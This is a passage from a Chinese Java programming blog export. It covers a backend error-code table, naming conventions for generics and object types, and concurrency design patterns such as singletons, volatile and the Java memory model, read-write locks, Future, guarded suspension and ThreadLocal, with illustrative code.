服务出错                   |                  |\n| C0152  | CDN 服务出错                   |                  |\n| C0153  | 域名解析服务出错               |                  |\n| C0154  | 网关服务出错                   |                  |\n| C0200  | 第三方系统执行超时             | 二级宏观错误码   |\n| C0210  | RPC 执行超时                   |                  |\n| C0220  | 消息投递超时                   |                  |\n| C0230  | 缓存服务超时                   |                  |\n| C0240  | 配置服务超时                   |                  |\n| C0250  | 数据库服务超时                 |                  |\n| C0300  | 数据库服务出错                 | 二级宏观错误码   |\n| C0311  | 表不存在                       |                  |\n| C0312  | 列不存在                       |                  |\n| C0321  | 多表关联中存在多个相同名称的列 |                  |\n| C0331  | 数据库死锁                     |                  |\n| C0341  | 主键冲突                       |                  |\n| C0400  | 第三方容灾系统被触发           | 二级宏观错误码   |\n| C0401  | 第三方系统限流                 |                  |\n| C0402  | 第三方功能降级                 |                  |\n| C0500  | 通知服务出错                   | 二级宏观错误码   |\n| C0501  | 短信提醒服务失败               |                  |\n| C0502  | 语音提醒服务失败               |                  |\n| C0503  | 邮件提醒服务失败               |                  |\n\n","tags":["编程规范"],"categories":["后端","编程规范"]},{"title":"Java命名规范","url":"/20250619/1761bce2.html","content":"\n\n\n# Java命名规范\n\n## 泛型类\n\n在书写泛型类时，通常做以下的约定：\n\n- E表示Element，通常用在集合中；\n- ID用于表示对象的唯一标识符类型\n- T表示Type(类型)，通常指代类；\n- K表示Key(键), 通常用于Map中；\n- V表示Value(值),通常用于Map中，与K结对出现；\n- N表示Number,通常用于表示数值类型；\n- ？表示不确定的Java类型；\n- X用于表示异常；\n- U,S表示任意的类型。\n\n##  速记Java开发中的各种O\n\n通过一张表和图快速对Java中的`BO`,`DTO`,`DAO`,`PO`,`POJO`,`VO`之间的含义，区别以及联系进行梳理。\n\n| 名称 | 使用范围                                       | 解释说明                                                     |\n| ---- | ---------------------------------------------- | ------------------------------------------------------------ |\n| BO   | 用于Service,Manager,Business等业务相关类的命名 | Business Object业务处理对象，主要作用是把业务逻辑封装成一个对象。 |\n| DTO  | 经过加工后的PO对象，其内部属性可能增加或减少   | Data Transfer  Object数据传输对象，主要用于远程调用等需要大量传输数据的地方，例如，可以将一个或多个PO类的部分或全部属性封装为DTO进行传输 |\n| DAO  | 用于对数据库进行读写操作的类进行命名           | Data Access  Object数据访问对象，主要用来封装对数据库的访问，通过DAO可以将POJO持久化为PO，也可以利用PO封装出VO和DTO |\n| PO   | Bean,Entity等类的命名                          | Persistant  Object持久化对象，数据库表中的数据在Java对象中的映射状态，可以简单的理解为一个PO对象即为数据库表中的一条记录 |\n| POJO | POJO是DO/DTO/BO/VO的统称                       | Plain Ordinary Java Object  简单Java对象，它是一个简单的普通Java对象，禁止将类命名为XxxxPOJO |\n| VO   | 通常是视图控制层和模板引擎之间传递的数据对象   | Value Object  值对象，主要用于视图层，视图控制器将视图层所需的属性封装成一个对象，然后用一个VO对象在视图控制器和视图之间进行数据传输。 |\n| AO   | 应用层对象                                     | Application Object，在Web层与Service层之间抽象的复用对象模型，很少用。 |\n\n下面将通过一张图来理解上述几种O之间相互转换的关系：\n\n![微信图片_20211213004837](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/eae992c8-ce71-47df-ae94-eca9bc91dac0-1679046277720-1.jpg) \n\n\n\n","tags":["编程规范"],"categories":["后端","编程规范"]},{"title":"多线程设计模式","url":"/20250619/8c062783.html","content":"\n![JAVA并发设计模式](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/%E5%B9%B6%E5%8F%91%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-1667230559743-54.png)\n\n# Chapter1：单例设计模式（七种设计方式）\n\n> Java高并发编程详解：第十四章\n\n## 饿汉式\n\n```java\npublic class SingletonObject1 {\n\n    private static SingletonObject1 instance = new SingletonObject1();\n\n    private SingletonObject1() {\n\n    }\n\n    public SingletonObject1 getInstance() {\n        return instance;\n    }\n}\n```\n\ninstance作为类变量，在主动使用SingletonObject1的时候，instance会被加载，包括其中的实例变量也会得到初始化。\n\n- 保证单例的唯一性\n- instance被ClassLoader加载很长时间后才会被使用 ，所有instance所占用的堆内存会被占用很久（instance实例比较大，就会占用比较大的堆内存）\n\n## 懒汉式（懒加载）\n\n```java\npublic class SingletonObject2 {\n\n    private static SingletonObject2 instance;\n\n    private SingletonObject2() {\n    }\n\n    public SingletonObject2 getInstance() {\n        if (instance == null) {\n            instance = new SingletonObject2();\n        }\n\n        return instance;\n    }\n}\n```\n\n- 多线程下，可能会存在多个实例，不能保证单例的唯一性\n\n  ![image-20220104175246651](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220104175246651-1667230559743-53.png) \n\n  \n\n## 懒汉式+同步方法\n\n```java\npublic class SingletonObject3 {\n\n    private static SingletonObject3 instance;\n\n    private SingletonObject3() {\n    }\n\n    public synchronized static SingletonObject3 getInstance() {\n        if (instance == null)\n            instance = new SingletonObject3();\n\n        return instance;\n    }\n}\n```\n\n- 保证单例的唯一性\n\n- 每次读取 都需要抢锁，同一时间只能有一个线程访问，性能低\n\n  \n\n## Double Check\n\n```java\nimport java.net.Socket;\nimport java.sql.Connection;\n\npublic class SingletonObject4 {\n    // 实例变量\n    private byte[] data = new byte[1024];\n    private Connection connection;\n    private Socket socket;\n\n    private static SingletonObject4 instance = null;\n\n    private SingletonObject4() {\n        // 初始化connection\n        this.connection\n        // 初始化socket\n        this.socket\n    }\n\n    public static SingletonObject4 getInstance() {\n        // 当instance为null时，进入同步代码块，可避免每次读取都进入\n        if (instance == null) {\n            // 只有一个线程能获取到SingletonObject4.classg关联的monitor\n            synchronized (SingletonObject4.class) {\n                // 判断如果instance为null时重建\n                if (instance == null)\n                    instance = new SingletonObject4();\n            }\n        }\n\n        return instance;\n    }\n}\n```\n\n根据JVM运行时指令重排序和Happens-Before规则，instance、connection和 socket 的实例化顺序并无前后关系的约束，那么极有可能是instance最先被实例化，而conn和sock并未完成实例化，并未完成初始化的实例调用其方法会**抛出空指针异常**\n\n![image-20220104182128644](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220104182128644-1667230559743-55.png) \n\n## Volatile + Double Check\n\n```java\nprivate volatile static SingletonObject4 instance = null;\n```\n\n- Double Check 方法调整下，SingletonObject4 实例化的过程中不允许重排序。\n- volatile 也不是线程安全的\n\n## Holder方式（推荐1）\n\n```java\npublic class SingletonObject6 {\n    private SingletonObject6() {\n    }\n\n    // 在静态内部类中持有SingletonObject6的实例，并且可被直接初始化\n    private static class InstanceHolder {\n        private final static SingletonObject6 instance = new SingletonObject6();\n    }\n\n    // 调用getInstance方法，实际上是获得InstanceHolder的instance静态属性\n    public static SingletonObject6 getInstance() {\n        return InstanceHolder.instance;\n    }\n}\n```\n\n当InstanceHolder被主动引用的时候，才会创建SingletonObject6的实例（static 主动加载）\n\n## 枚举方式（推荐2）\n\n```java\npublic class SingletonObject7 {\n    private SingletonObject7() {\n        System.out.println(\"3-----------\");\n    }\n\n    private enum Singleton {\n        INSTANCE;\n\n        private final SingletonObject7 instance;\n\n        Singleton() {\n            System.out.println(\"2-----------\");\n            instance = new SingletonObject7();\n        }\n\n        SingletonObject7 getInstance() {\n            System.out.println(\"4-----------\");\n            return this.instance;\n        }\n    }\n\n    public static SingletonObject7 getInstance() {\n        System.out.println(\"1-----------\");\n        return Singleton.INSTANCE.getInstance();\n    }\n\n    public static void main(String[] args) {\n        System.out.println(SingletonObject7.getInstance().hashCode());\n        System.out.println(SingletonObject7.getInstance().hashCode());\n    }\n}\n```\n\n输出\n\n```java\n1-----------\n2-----------\n3-----------\n4-----------\n1836019240\n1-----------\n4-----------\n1836019240\n```\n\n\n\n# Chapter2：WaitSet（等待池）\n\n1. 所有的对象都会有一个wait set, 用来存放调用了该对象wait方法之后进入了block状态的线程\n\n2. 线程被notify之后，进入runnable状态，不一定立即得到执行\n\n3. 线程从wait set 中被唤醒的顺序不一定是FIFO\n\n4. 线程从wait set 中被唤醒之后，需要重新抢锁。抢到锁之后，根据wait时记录的执行代码地址，进行==地址恢复==，继续往后执行。\n\n   \n\n#  Chapter3：volatile 关键字\n\n> Java高并发编程详解：第十二章、第十三章\n\n\n\n```java\npublic class VolatileTest {\n\n    private volatile static int INIT_VALUE = 0;\n    private final static int MAX_VALUE = 5;\n\n    public static void main(String[] args) {\n\n        new Thread(() -> {\n            int localValue = INIT_VALUE;\n            while (localValue < MAX_VALUE) {\n                if (localValue != INIT_VALUE) {\n                    System.out.printf(\"The value updated from [%d] to [%d]\\n\", localValue, INIT_VALUE);\n                    localValue = INIT_VALUE;\n                }\n            }\n        }, \"READER\").start();\n\n        new Thread(() -> {\n            int localValue = INIT_VALUE;\n            while (localValue < MAX_VALUE) {\n                INIT_VALUE = ++localValue;\n                System.out.printf(\"Update the value to [%d]\\n\", INIT_VALUE);\n                try {\n                    Thread.sleep(500);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }, \"WRITER\").start();\n    }\n}\n```\n\n输出结果\n\n```apl\nUpdate the value to [1]\nThe value updated from [0] to [1]\nUpdate the value to [2]\nThe value updated from [1] to [2]\nUpdate the value to [3]\nThe value updated from [2] to [3]\nThe value updated from [3] to [4]\nUpdate the value to [4]\nThe value updated from [4] to [5]\nUpdate the value to [5]\n```\n\n## CPU缓存一致性问题\n\n\t\t- 解决方式1：总线加锁方式\n\t\t- 解决方式2：CPU高速缓存一致性协议\n\n​\t\t在现代计算机中，CPU 的速度是极高的，如果 CPU 需要存取数据时都直接与内存打交道，在存取过程中，CPU 将一直空闲，这是一种极大的浪费，所以，为了提高处理速度，CPU 不直接和内存进行通信，而是在 CPU 与内存之间加入很多寄存器，多级缓存，它们比内存的存取速度高得多，这样就解决了 CPU 运算速度和内存读取速度不一致问题。\n\n​\t\t由于 CPU 与内存之间加入了缓存，在进行数据操作时，先将数据从内存拷贝到缓存中，CPU 直接操作的是缓存中的数据。但在多处理器下，将可能导致各自的缓存数据不一致（这也是可见性问题的由来），为了保证各个处理器的缓存是一致的，就会实现缓存一致性协议，而**嗅探是实现缓存一致性的常见机制**。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-77acfee471d8827a2121157c68f2485d_720w-1667230559743-56.jpg)  \n\n​\t\t在缓存一致性协议中最为出名的时Intel的==MESI==协议。MESI协议保证了每个缓存中使用的共享变量副本是一致的，她的大致思想是：当CPU在操作Cache中的数据时，如果发现该变量是一个共享变量，也就是说在其他的CPU Cache 中也存在一个副本，那么进行如下操作：\n\n​\t\t① 读取操作，不做任何处理，只是将Cache中的数据读取到寄存器\n\n​\t\t② 写入操作，发出信号通知其他CPU将该变量的Cache line置为无效标志，其他CPU在进行该变量读取数据的时候就不得不到主内存中再次获取。\n\n\n\n## Java内存模型JMM（Java Memory Model）\n\n​\t\tJava的内存模型决定了一个线程对共享变量的写入如何让其他线程可见，Java内存模型定义了线程和主内存之间的抽象关系\n\n- 共享变量存储于主内存之中，每个线程都可以访问。\n- 每个线程都有私有的工作内存（或者叫做本地内存）\n- 线程不能直接操作主内存，只是先操作了工作内存之后，才写入主内存\n- 工作内存和Java内存模型一样，也是一个抽象的概念，其实并不存在。它涵盖了缓存、寄存器、编译器优化以及硬件等。\n\n![image-20220105142137063](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220105142137063-1667230559746-57.png) \n\n\n\n## JMM与并发编程的三大特性\n\n### 原子性\n\n 一个操作或者多个操作，要么所有的操作全部都得到了执行并且不会受到任何因素的干扰而中断，要么所有的操作都不执行\n\n```\nJMM 仅保证了基本数据类型的读写的原子性操作，其他均不保证。\n如果想要保证某段代码具有原子性，需要使用synchronized 或者 JUC 中的lock。\n如果想要int等类型的自增操作具有原子性，可以使用JUC包下的原子封装类型：`java.util.concurrent.atomic`\n```\n\n### 可见性\n\n```\nJava提供了以下三种方式保证可见性\n①volatile关键字\n②synchronized关键字\n③JUC提供的显示锁Lock \n```\n\n### 有序性\n\n```\nJava提供了以下三种方式保证有序性\n①volatile关键字\n②synchronized关键字\n③JUC提供的显示锁Lock \n```\n\n## Happens-before原则：JMM具备的天生的有序性规则\n\n- 程序次序规则\n\n  ```\n  在一个线程内，代码按照编写时的次序执行，编写在后面的操作发生于编写在前面的操作之后。\n  \n  这句话的意思看起来是程序按照編写的顺序来执行，但是虚拟机还是可能会对程序代码的指令进行重排序，只要确保在一个线程内最终的结果和代码顺序执行的结果一致即可。\n  ```\n\n- 锁定规则\n\n  ```\n  一个unlock操作要先行发生于对同一个锁的lock操作\n  \n  这句话的意思是，无论是在单线程还是在多线程的环境下，如果同一个锁是锁定状态，那么必须先对其执行释放操作之后才能继续进行lock操作。\n  ```\n\n- volatile变量规则\n\n  ```\n  对一个变量的写操作要早于对这个变量之后的读操作\n  \n  根据字面的意思来理解是，如果一个变量使用volatlle关键字修饰，一个线程对它进行读操作，一个线程对它进行写操作，那么写入操作肯定要先行发生于读操作，\n  ```\n\n- 传递规则\n\n  ```\n  如果操作A先于操作B，而操作B又先于操作c，则可以得出操作A肯定要先于操作C，这一点说明了happens-before原则具各传递性\n  ```\n\n- 线程启动规则\n\n  ```\n  Thread对象的start()方法先行发生于对该线程的任何操作，所以才说：只有start之后线程才能真正运行，否则Thread也只是一个对象而已\n  ```\n\n- 线程中断规则\n\n  ```\n  对线程执行interrupt()方法肯定要优先于捕获到中断信号\n  \n  这句话的意思是指如果线程收到了中断信号，那么在此之前势必要有interrupt()\n  ```\n\n- 线程的终结规则\n\n  ```\n    线程中所有的操作都要先行发生于线程的终止检测\n    通俗地讲，线程的任务执行、逻辑单元执行肯定要发生于线程死亡之前。\n  ```\n\n- 对象的终结规则\n\n  ```\n   一个对象初始化的完成先行发生于finalwe()方法之前，这个更没什么好说的了，先有生后有死\n  ```\n\n## volatile 关键字特性总结\n\n1. 保证重排序的时候，不会把后面的指令放到屏障之前，也不会把前面的放到后面\n2. 强制对缓存的修改操作立刻写入主存\n3. 如果是写操作，会导致其他CPU中的缓存失效。\n\n# Chapter4：观察者模式\n\n>Java高并发编程详解：第十五章\n\n参考：http://c.biancheng.net/view/1390.html\n\n- Demo1\n\n设计模式图\n\n![image-20220109155129782](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220109155129782-1667230559746-58.png)  \n\n代码示例：监控对象\n\n```java\npublic class Subject {\n\n    private List<Observer> observers = new ArrayList<>();\n\n    private int state;\n\n    public int getState() {\n        return this.state;\n    }\n\n    public void setState(int state) {\n        if (this.state == state) {\n            return;\n        }\n        this.state = state;\n        // Subject存在变更，observers同步执行\n        notifyAllObserver();\n    }\n\n    private void notifyAllObserver() {\n        observers.stream().forEach(Observer::update);\n    }\n\n    public void attach(Observer observer) {\n        this.observers.add(observer);\n    }\n}\n```\n\n```java\npublic abstract class Observer {\n    protected Subject subject;\n\n    public Observer(Subject subject) {\n        this.subject = subject;\n        this.subject.attach(this);\n    }\n\n    // 执行体由不同的Observer子类完成\n    public abstract void update();\n}\n```\n\n```java\npublic class BinaryObserver extends Observer {\n\n    public BinaryObserver(Subject subject) {\n        super(subject);\n    }\n\n    @Override\n    public void update() {\n        System.out.println(\"Binary String:\" + Integer.toBinaryString(subject.getState()));\n    }\n}\n```\n\n```java\npublic class OctalObserver extends Observer {\n    public OctalObserver(Subject subject) {\n        super(subject);\n    }\n\n    @Override\n    public void update() {\n        System.out.println(\"Octal String:\" + Integer.toOctalString(subject.getState()));\n    }\n}\n```\n\n```java\npublic class ObserverPatternDemo {\n    public static void main(String[] args) {\n        final Subject subject = new Subject();\n        new BinaryObserver(subject);\n        new OctalObserver(subject);\n        System.out.println(\"===============1==========\");\n        subject.setState(10);\n        System.out.println(\"===============2==========\");\n        subject.setState(10);\n        System.out.println(\"===============3==========\");\n        subject.setState(20);\n    }\n}\n```\n\n# Chapter5：Single Thread Execution 设计模式\n\n单线程执行设计模式\n\n> Java高并发编程详解：第十六章\n\n线程不安全原因：\n\n1. 共享资源\n2. 临界值\n3. 多线程竞争（各线程都会有可能变更共享资源的状态）\n\n\n解决：保证共享资源的写操作同一时间只有一个线程操作\n\n#　Chapter６：读写锁分离设计模式\n\n> Java高并发编程详解：第十七章\n\n共享资源在多个线程在进行读写操作时不会引起冲突\n\n| 线程 |            读            |            写            |\n| :--: | :----------------------: | :----------------------: |\n|  读  |          不冲突          | 冲突（只允许单线程运行） |\n|  写  | 冲突（只允许单线程运行） | 冲突（只允许单线程运行） |\n\n```java\n/**\n * 读写分离锁\n */\npublic class ReadWriteLock {\n    private int readingReaders = 0;\n    private int waitingReaders = 0;\n    private int writingWriters = 0;\n    private int waitingWriters = 0;\n\n    // 控制倾向性，有写操作等待时，优先执行\n    private final boolean preferWriter;\n\n    public ReadWriteLock() {\n        this.preferWriter = true;\n    }\n\n    public ReadWriteLock(boolean preferWriter) {\n        this.preferWriter = preferWriter;\n    }\n\n\n    public synchronized void readLock() throws InterruptedException {\n        try {\n            this.waitingReaders++;\n            while (writingWriters > 0 || (preferWriter && waitingWriters > 0)) {\n                this.wait();\n            }\n            this.readingReaders++;\n        } finally {\n            this.waitingReaders--;\n        }\n    }\n\n    public synchronized void readUnlock() {\n        this.readingReaders--;\n        this.notifyAll();\n    }\n\n    public synchronized void writeLock() throws InterruptedException {\n        try {\n            this.waitingWriters++;\n            while (readingReaders > 0 || writingWriters > 0) {\n                this.wait();\n            }\n            writingWriters++;\n        } finally {\n            waitingWriters--;\n        }\n    }\n\n    public synchronized void writeUnlock() {\n        writingWriters--;\n        notifyAll();\n    }\n}\n```\n\n```java\n/**\n * 共享资源读/写执行\n */\npublic class SharedData {\n\n    // 共享资源\n    private final char[] buffer;\n\n    // 读写锁\n    private final ReadWriteLock lock = new ReadWriteLock();\n\n    public SharedData(int size) {\n        // 初始化共享资源\n        buffer = new char[size];\n        for (int i = 0; i < size; i++) {\n            this.buffer[i] = '*';\n        }\n    }\n\n\n    public char[] read() throws InterruptedException {\n        try {\n            lock.readLock();\n            return this.doRead();\n        } finally {\n            lock.readUnlock();\n        }\n    }\n\n    public void write(char c) throws InterruptedException {\n        try {\n            lock.writeLock();\n            this.doWrite(c);\n        } finally {\n            lock.writeUnlock();\n        }\n    }\n\n    private void doWrite(char c) {\n        for (int i = 0; i < buffer.length; i++) {\n            buffer[i] = c;\n            slowly(10);\n        }\n    }\n\n    /**\n     * @return：共享资源的副本\n     */\n    private char[] doRead() {\n        char[] newBuf = new char[buffer.length];\n        for (int i = 0; i < buffer.length; i++) {\n            newBuf[i] = buffer[i];\n        }\n\n        slowly(50);\n        return newBuf;\n    }\n\n\n    private void slowly(int ms) {\n        try {\n            Thread.sleep(ms);\n        } catch (InterruptedException e) {\n        }\n    }\n\n}\n```\n\n\n\n```java\n/**\n * 线程-读资源\n */\npublic class ReaderWorker extends Thread {\n    private final SharedData data;\n\n    public ReaderWorker(SharedData data) {\n        this.data = data;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                char[] buf = data.read();\n                System.out.println(Thread.currentThread() + \" read \" + String.valueOf(buf));\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```java\n/**\n * 线程-写资源\n */\npublic class WriterWorker extends Thread {\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    private final SharedData sharedData;\n\n    private int index = 0;\n    private final String filler;\n\n    public WriterWorker(SharedData sharedData, String filler) {\n        this.sharedData = sharedData;\n        this.filler = filler;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                char c = nextChar();\n                sharedData.write(c);\n                System.out.println(Thread.currentThread().getName() + \" write \" + c);\n                Thread.sleep(random.nextInt(1000));\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private char nextChar() {\n        char c = filler.charAt(index);\n        index++;\n        if (index >= filler.length())\n            index = 0;\n        return c;\n    }\n}\n```\n\n测试类\n\n```java\npublic class ReadWritLockClient {\n    public static void main(String[] args) {\n        final SharedData sharedData = new SharedData(10);\n        new ReaderWorker(sharedData).start();\n        new ReaderWorker(sharedData).start();\n        new ReaderWorker(sharedData).start();\n        new ReaderWorker(sharedData).start();\n        new ReaderWorker(sharedData).start();\n        new WriterWorker(sharedData, \"qwertyuiopasdfg\").start();\n        new WriterWorker(sharedData, \"QWERTYUIOPASDFG\").start();\n    }\n}\n```\n\n\n\n# Chapter7：不可变对象设计模式\n\n> Java高并发编程详解：第十八章\n\n不可变对象定义\n\n- 不可变对象是没有机会去修改的\n- 每一次修改都会导致一个新的对象的产生。\n\n不可变对象必要条件（String、Integer、Float 等）\n\n- 确保类是final 的，不允许被其他类继承。（final修饰的类，被继承的提示：There is no default constructor available in 'com.hots.part2.chapter7.Person'）\n\n- 确保所有的成员变量是final 的，**引用类型所引用的对象同样不可变**\n\n- 不要提供任何setter 方法。\n\n  **引用集合，GET方法返回unmodifiable的集合**\n\n  ```java\n  public List<String> getList() {\n      return Collections.unmodifiableList(list);\n  }\n  ```\n\n- 如果要修改类的状态，必须返回一个新的对象。\n\n```java\n/**\n * 不可变对象\n */\nfinal public class Person {\n    private final String name;\n    private final String address;\n\n    public Person(final String name, final String address) {\n        this.name = name;\n        this.address = address;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", address='\" + address + '\\'' +\n                '}';\n    }\n}\n```\n\n# Chapter8：Future设计模式\n\n> Java高并发编程详解：第十九章\n\nFuture 代表的是未来的一个凭据，保留隔离的逻辑程序执行结果\n\n\n\n```java\npublic interface Future<T> {\n    T get();\n}\n```\n\n```java\npublic class AsyncFuture<T> implements Future<T> {\n\n    private volatile boolean done = false;\n\n    private T result;\n\n    public void done(T result) {\n        synchronized (this) {\n            this.result = result;\n            this.done = true;\n            this.notifyAll();\n        }\n    }\n\n    @Override\n    public T get() throws InterruptedException {\n        synchronized (this) {\n            while (!done) {\n                this.wait();\n            }\n        }\n        return result;\n    }\n}\n```\n\n```java\npublic interface FutureTask<T> {\n    T call();\n}\n```\n\n```java\npublic class FutureService {\n\n    public <T> Future<T> submit(final FutureTask<T> futureTask, final Consumer<T> consumer) {\n        AsyncFuture<T> asyncFuture = new AsyncFuture<>();\n        new Thread(() -> {\n            T result = futureTask.call();\n            asyncFuture.done(result);\n            consumer.accept(result);\n        }).start();\n        return asyncFuture;\n    }\n}\n```\n\n```java\npublic class SyncInvoker {\n    public static void main(String[] args) throws InterruptedException {\n        FutureTask<String> futureTask = () -> {\n            try {\n                TimeUnit.SECONDS.sleep(15);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n            return \"finish jobs\";\n        };\n\n        FutureService futureService = new FutureService();\n        Future<String> result = futureService.submit(futureTask, System.out::println);\n\n        System.out.println(\"===========\");\n        System.out.println(\"do other thing.\");\n        TimeUnit.SECONDS.sleep(10);\n        System.out.println(\"===========\");\n\n        System.out.println(\"results from job：\" + result.get());\n\n    }\n}\n```\n\n\n\n\n\n# Chapter9：Guarded Suspension 设计模式（保护性暂挂模式）\n\n>Java高并发编程详解：第二十章\n\n当线程访问某个对象时，发现条件不满足，就暂时挂起等待条件满足时再次访问。\n\n- 处理的消息内容\n\n```java\npublic class Request {\n    final private String value;\n\n    public Request(String value) {\n        this.value = value;\n    }\n\n    public String getValue() {\n        return value;\n    }\n}\n```\n\n\n\n```java\npublic class RequestQueue {\n\n    // 任务队列\n    private final LinkedList<Request> queue = new LinkedList<>();\n\n    /**\n     * 服务端处理任务\n     */\n    public Request getRequest() {\n        synchronized (queue) {\n            while (queue.size() <= 0) {\n                try {\n                    queue.wait();\n                } catch (InterruptedException e) {\n                    System.out.println(\"queue wait interrupted\");\n                    return null;\n                }\n            }\n\n            return queue.removeFirst();\n        }\n    }\n\n    /**\n     * 客户端推送任务\n     */\n    public void putRequest(Request request) {\n        synchronized (queue) {\n            queue.add(request);\n            queue.notifyAll();\n        }\n    }\n}\n```\n\n```java\n/**\n * 客户端: 发送任务\n */\npublic class ClientThread extends Thread {\n    private final RequestQueue queue;\n\n    private Random random;\n\n    private final String sendValue;\n\n\n    public ClientThread(RequestQueue queue, String sendValue) {\n        this.queue = queue;\n        this.sendValue = sendValue;\n        this.random = new Random(System.currentTimeMillis());\n    }\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"Client -> request \" + sendValue);\n            queue.putRequest(new Request(sendValue));\n            try {\n                Thread.sleep(random.nextInt(50));\n            } catch (InterruptedException e) {\n                System.out.println(\"Client -> Wake up from sleeping\");\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n```java\n/**\n * 服务端：处理任务\n */\npublic class ServerThread extends Thread {\n    private RequestQueue queue;\n    private Random random;\n\n    private volatile boolean closed = false;\n\n\n    public ServerThread(RequestQueue queue) {\n        this.queue = queue;\n        this.random = new Random(System.currentTimeMillis());\n    }\n\n\n    @Override\n    public void run() {\n        while (!closed) {\n            Request request = queue.getRequest();\n            if (null == request) {\n                // queue从wait中被打断\n                System.out.println(\"Received the empty request.\");\n                continue;\n            }\n            System.out.println(\"Server ->\" + request.getValue());\n            try {\n                Thread.sleep(random.nextInt(100));\n            } catch (InterruptedException e) {\n                System.out.println(\"Server -> Wake up from sleeping\");\n                return;\n            }\n        }\n    }\n\n    /**\n     * 关闭服务端线程\n     */\n    public void close() {\n        this.closed = true;\n        this.interrupt();\n    }\n}\n```\n\n```java\n/**\n * 测试类\n */\npublic class SuspensionClient {\n    public static void main(String[] args) throws InterruptedException {\n\n        final RequestQueue queue = new RequestQueue();\n\n        ClientThread clientThread = new ClientThread(queue, \"test\");\n        clientThread.start();\n\n        ServerThread serverThread = new ServerThread(queue);\n        serverThread.start();\n\n        Thread.sleep(10000);\n\n        System.out.println(\"Server ready to close.\");\n        serverThread.close();\n    }\n}\n```\n\n# Chapter10：ThreadLocal：线程局部变量\n\n- This class provides thread-local variables. These variables differ from their  normal counterparts in that each thread that accesses one (via its  `get` or `set` method) has its own, independently  initialized copy of the variable.\n\n- `ThreadLocal` instances are  typically private static fields in classes that wish to associate state with a  thread (e.g., a user ID or Transaction ID). \n\n- 每个访问`ThreadLocal`变量的线程，都会获取到一个`ThreadLocal`变量的**副本**，线程之间互不影响。\n- `始终以当前线程作为KEY值`\n\n```java\npublic class ThreadLocalSimpleTest {\n    private static ThreadLocal<String> threadLocal = new ThreadLocal<String>() {\n        @Override\n        protected String initialValue() {\n            return \"设置默认值\";\n        }\n    };\n\n    public static void main(String[] args) throws InterruptedException {\n        // 主线程获取ThreadLocal\n        System.out.println(Thread.currentThread().getName() + \"--\" + threadLocal.hashCode() + \"---\" + threadLocal.get());\n        threadLocal.set(\"TEST\");\n        Thread.sleep(1_000L);\n        System.out.println(Thread.currentThread().getName() + \"--\" + threadLocal.hashCode() + \"---\" + threadLocal.get());\n\n        new Thread(() -> {\n            threadLocal.set(\"TEST-1\");\n            System.out.println(Thread.currentThread().getName() + \"--\" + threadLocal.hashCode() + \"---\" + threadLocal.get());\n        }).start();\n\n        new Thread(() -> {\n            threadLocal.set(\"TEST-2\");\n            System.out.println(Thread.currentThread().getName() + \"--\" + threadLocal.hashCode() + \"---\" + threadLocal.get());\n        }).start();\n\n\n        Thread.sleep(1_000L);\n        // 主线程再次获取ThreadLocal\n        System.out.println(Thread.currentThread().getName() + \"--\" + threadLocal.hashCode() + \"---\" + threadLocal.get());\n    }\n}\n```\n\n输出\n\n```java\nmain--1836019240---设置默认值\nmain--1836019240---TEST\nThread-0--1836019240---TEST-1\nThread-1--1836019240---TEST-2\nmain--1836019240---TEST\n```\n\n\n\n# Chapter11：The Thread-Specific Storage：线程保险箱\n\n> Java高并发编程详解：第二十一章 \n\n线程上下文：线程级别的单例，利用ThreadLocal实现。\n\n```java\n/**\n * 上下文内容\n */\n@Getter\n@Setter\npublic class Context {\n    private String name;\n    private String cardId;\n}\n```\n\n```java\n/**\n * 线程上下文工具类：线程级别的单例\n */\npublic class ActionContext {\n    private ActionContext() {\n\n    }\n\n    private static final ThreadLocal<Context> threadLocal = new ThreadLocal<Context>() {\n        @Override\n        protected Context initialValue() {\n            return new Context();\n        }\n    };\n\n    private static class ContextHolder {\n        private final static ActionContext actionContext = new ActionContext();\n    }\n\n    public static ActionContext getActionContext() {\n        return ActionContext.ContextHolder.actionContext;\n    }\n\n    public Context getContext() {\n        return threadLocal.get();\n    }\n}\n```\n\n```java\n/**\n * 线程工作内容\n */\npublic class ExecutionTask implements Runnable {\n\n    private QueryFromDBAction queryFromDBAction = new QueryFromDBAction();\n    private QueryFromHttpAction queryFromHttpAction = new QueryFromHttpAction();\n\n    @Override\n    public void run() {\n        // 分步骤获取\n        queryFromDBAction.execute();\n        System.out.println(Thread.currentThread().getName() + \" The name query successful\");\n        queryFromHttpAction.execute();\n        System.out.println(Thread.currentThread().getName() + \" The card id query successful\");\n        // 最后，统一获取\n        Context context = ActionContext.getActionContext().getContext();\n        System.out.println(\"The Name is \" + context.getName() + \" and CardId \" + context.getCardId());\n    }\n}\n```\n\n```java\n/**\n * 线程工作内容：从DB获取\n */\npublic class QueryFromDBAction {\n    public void execute() {\n        try {\n            Thread.sleep(1000L);\n            String name = \"Alex \" + Thread.currentThread().getName();\n            ActionContext.getActionContext().getContext().setName(name);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```java\n/**\n * 线程工作内容：从网络获取\n */\npublic class QueryFromHttpAction {\n    public void execute() {\n        Context context = ActionContext.getActionContext().getContext();\n        String name = context.getName();\n        String cardId = getCardId(name);\n        context.setCardId(cardId);\n    }\n\n    private String getCardId(String name) {\n        try {\n            Thread.sleep(1000L);\n        